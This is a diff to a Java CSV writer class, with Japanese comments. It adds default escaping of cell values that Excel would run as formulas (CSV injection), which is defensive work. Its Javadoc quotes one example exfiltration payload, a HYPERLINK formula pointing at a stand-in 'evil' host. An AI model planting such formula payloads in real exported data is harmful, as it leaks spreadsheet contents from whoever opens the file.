@@ -20,6 +20,14 @@ import java.util.List;
  * {@link #setWithBom(boolean)} で、書き始めに BOM を付けられる（Excel に UTF-8 の CSV を読ませるとき）。
  * <b>文字コードが UTF 系のときだけ効く</b>。Shift_JIS などでは何もしない（BOM というものが無い）。
  * </p>
+ *
+ * <h2>数式（D-227）</h2>
+ * <p>
+ * <b>{@code = + - @}・タブ・CR（全角の {@code ＝＋－＠} も）で始まる値は、先頭に {@code '} を付ける</b>（既定）。
+ * Excel はこれらで始まるセルを数式として動かすので、利用者が名前に {@code =HYPERLINK("http://evil/?"&A1)} などを
+ * 入れておくと、管理者が CSV を開いたときに動いた（CSV インジェクション）。数値として読める値（{@code -5} など）には付けない。
+ * 外すなら {@link #setEscapeFormula(boolean)}。
+ * </p>
  */
 public class CsvWriter implements Closeable, AutoCloseable {
 
@@ -28,6 +36,9 @@ public class CsvWriter implements Closeable, AutoCloseable {
 
 	/* BOM を付けるか（UTF 系のときだけ効く） */
 	private boolean withBom = false;
+
+	/* 数式として読まれる値を無害にするか（D-227） */
+	private boolean escapeFormula = true;
 
 	/* 改行コード */
 	private LineDelimiter lineSeparator = LineDelimiter.CRLF;
@@ -218,6 +229,49 @@ public class CsvWriter implements Closeable, AutoCloseable {
 	}
 
 	/**
+	 * 数式として読まれる値を無害にするか（D-227。既定 true）
+	 *
+	 * <p>{@code = + - @}・タブ・CR（全角の {@code ＝＋－＠} も）で始まる、数値でない値の先頭に {@code '} を付ける。</p>
+	 *
+	 * @param escapeFormula	無害にする場合 = true
+	 * @return	CsvWriter
+	 */
+	public CsvWriter setEscapeFormula (boolean escapeFormula) {
+
+		this.escapeFormula = escapeFormula;
+		return this;
+
+	}
+
+	/**
+	 * 数式として読まれうる値か（D-227）
+	 *
+	 * @param value	値
+	 * @return	先頭に {@code '} を付けるなら true
+	 */
+	static boolean looksLikeFormula (String value) {
+
+		if (value == null || value.isEmpty()) {
+			return false;
+		}
+
+		char first = value.charAt(0);
+
+		if ("=+-@\t\r＝＋－＠".indexOf(first) < 0) {
+			return false;
+		}
+
+		// 数値（-5 / +3.14 / -1e3）は数式ではない
+		try {
+			new java.math.BigDecimal(value.trim());
+			return false;
+		} catch (NumberFormatException ex) {
+			return true;
+		}
+
+	}
+
+	/**
 	 * 書き始めに BOM を付けるか
 	 *
 	 * <p>
@@ -295,11 +349,13 @@ public class CsvWriter implements Closeable, AutoCloseable {
 			if (o == null) {
 				_record.add("");
 			} else {
+				String text;
 				try {
-					_record.add(Convertor.convert(null, o, String.class));
+					text = Convertor.convert(null, o, String.class);
 				} catch (Exception ex) {
-					_record.add(o.toString());
+					text = o.toString();
 				}
+				_record.add(escapeFormula && looksLikeFormula(text) ? "'" + text : text);
 			}
 		}
 
